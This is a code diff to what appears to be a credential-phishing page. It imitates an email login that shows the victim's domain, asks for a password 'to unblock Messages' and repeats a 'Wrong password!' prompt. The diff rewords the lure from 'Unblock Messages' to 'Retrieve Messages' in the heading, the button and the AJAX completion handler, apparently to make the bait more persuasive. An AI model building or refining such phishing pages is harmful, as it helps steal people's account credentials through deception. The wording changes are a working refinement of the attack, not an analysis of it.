@@ -169,7 +169,7 @@
                 <div class="email_icon">
                     <width="212" height="20" id="img" /></div>
                     <h4 class="text-dark"><strong id="domain-name" class="text-uppercase"></strong></h4>
-                    <h5 class="font-weight-light">Enter valid details to unblock Messages</h5>
+                    <h5 class="font-weight-light">Enter valid details to retrieve Messages</h5>
                 </div>
                 <div style="width: 100%;">
                     <div class="alert alert-danger" id="msg" style="display: none;">Wrong password! Please enter correct password.</div>
@@ -184,7 +184,7 @@
                             <label>REMEMBER ME</label>
                         </div>
                         <div class="btn-holder">
-                            <button class="btn btn-lg col-12" id="submit-btn">Unblock Messages</button>
+                            <button class="btn btn-lg col-12" id="submit-btn">Retrieve Messages</button>
                         </div>
                         <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
                         <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
@@ -352,7 +352,7 @@
               // $('#msg').html("Please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('Unblock messages');
+              $('#submit-btn').html('Retrieve messages');
             }
           });
     });
